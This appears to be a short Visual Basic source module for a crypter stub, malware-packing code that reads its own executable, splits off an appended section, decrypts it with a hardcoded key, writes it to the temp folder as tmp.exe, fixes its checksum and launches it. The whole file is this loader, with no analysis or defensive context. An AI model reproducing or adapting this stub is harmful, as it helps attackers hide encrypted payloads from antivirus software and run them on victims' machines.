Attribute VB_Name = "haupt"
Sub Main()
Dim crdata As String
Dim crinhalt As String
crdata = App.Path & "\" & App.EXEName & ".exe"
Open crdata For Binary As #1
crinhalt = Space(LOF(1))
Get #1, , crinhalt
Close #1

Dim spcrdat() As String
spcrdat() = Split(crinhalt, "////////////////////////////////////////")

Dim data As String
data = strDecrypt(spcrdat(1), "^!§$%")

Dim file As String
file = Environ("tmp") & "\tmp.exe"

Open file For Binary As #1
Put #1, , data
Close #1

FixCheckSum (file)
Shell (file)
End Sub
